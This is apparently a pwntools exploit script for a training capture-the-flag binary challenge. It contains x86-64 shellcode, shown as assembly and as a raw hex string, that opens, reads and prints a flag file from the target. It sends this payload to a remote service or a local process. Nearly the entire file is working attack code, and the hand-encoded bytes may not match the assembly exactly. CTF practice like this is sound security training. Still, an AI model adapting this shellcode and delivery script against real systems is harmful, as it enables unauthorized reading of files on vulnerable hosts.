from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" in args:
    r = remote("bin.training.offdef.it", 5001)
else:
    r = process("./benchmarking_service")
    gdb.attach(r, """
    c
    """)
    input("wait")

assembly_code = """
; Open file /chall/flag
xor rax, rax                ; Clear RAX
push rax                    ; Push 0x00 to stack (string terminator for the filename)
mov rdi, 0x67616c66         ; Move 'flag' into RDI
push rdi                    ; Push 'flag' to stack
mov rdi, 0x6c6c6163682f     ; Move '/chall' into RDI
push rdi                    ; Push '/chall' to stack
mov rdi, rsp                ; RDI now points to '/chall/flag'
xor rsi, rsi                ; Flag for read-only (0)
mov al, 2                   ; System call number for open
syscall

; Read from file
mov rdi, rax                ; File descriptor from previous syscall
mov rsi, rsp                ; Use stack as buffer
xor rdx, rdx
mov dl, 0xff                ; Read up to 255 bytes (can be adjusted)
xor rax, rax                ; System call number for read
syscall

; Write to STDOUT
mov rdx, rax                ; Number of bytes read
xor rdi, rdi
inc rdi                     ; File descriptor 1 is STDOUT
mov al, 1                   ; System call number for write
syscall

; Exit
xor rdi, rdi                ; Exit code 0
mov al, 60                  ; System call number for exit
syscall
"""
# Without comments beceause they are not supported by pwntools
assembly_code = """
xor rax, rax
push rax
mov rdi, 0x67616c66
push rdi
mov rdi, 0x6c6c6163682f
push rdi
mov rdi, rsp
xor rsi, rsi
mov al, 2
syscall

mov rdi, rax
mov rsi, rsp
xor rdx, rdx
mov dl, 0xff
xor rax, rax
syscall

mov rdx, rax
xor rdi, rdi
inc rdi
mov al, 1
syscall

xor rdi, rdi
mov al, 60
syscall
"""

r.recvuntil(b": ")

assembled_code = asm(assembly_code, arch = 'amd64')

#r.sendline(assembled_code)

shellcode = "\x48\x31\xC0\x50\x48\xC7\xC7\x66\x6C\x61\x67\x57\x48\xBF\x2F\x68\x63\x61\x6C\x6C\x00\x00\x57\x48\x89\xE7\x48\x31\xF6\xB0\x02\x0F\x05\x48\x89\xC7\x48\x89\xE6\x48\x31\xD2\xB2\xFF\x48\x31\xC0\x0F\x05\x48\x89\xC2\x48\x31\xFF\x48\xFF\xC7\xB0\x01\x0F\x05\x48\x31\xFF\xB0\x3C\x0F\x05"
r.sendline(shellcode)

r.interactive()